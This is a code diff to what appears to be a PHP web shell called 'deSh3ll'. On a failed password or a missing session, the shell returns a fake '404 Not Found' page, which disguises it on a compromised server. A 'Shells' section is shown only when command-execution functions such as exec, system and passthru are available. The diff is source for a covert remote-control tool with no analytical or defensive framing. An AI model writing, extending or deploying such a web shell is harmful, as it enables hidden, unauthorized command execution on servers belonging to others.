@@ -29,7 +29,7 @@ if(isset($_POST['pass']))
 	else
 	{
 		session_destroy();
-		http_response_code(404);
+		header("HTTP/1.1 404 Not Found");
 		echo "$notfound";
 		exit;
 	}
@@ -39,7 +39,7 @@ else if(isset($_SESSION['login']))
 	if ($_SESSION['login'] != true)
 	{
 		session_destroy();
-		http_response_code(404);
+		header("HTTP/1.1 404 Not Found");
 		echo "$notfound";
 		exit;
 	}
@@ -47,7 +47,7 @@ else if(isset($_SESSION['login']))
 else
 {
 	session_destroy();
-	http_response_code(404);
+	header("HTTP/1.1 404 Not Found");
 	echo "$notfound";
 	exit;
 }
@@ -2945,13 +2945,13 @@ else
 }
 ?>
 
-<br><br><h3><A NAME='Shells' href="#Shells">Shells</A></h3>
-
 <?php
 
 if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec == True) || ($system == True) || ($passthru == True))
 {
 echo "
+<br><br><h3><A NAME='Shells' href=\"#Shells\">Shells</A></h3>
+
 <table class='flat-table flat-table-3'>
 		<form action='?deSh3ll=bmps#Shells' method='post' >
 			<tr>
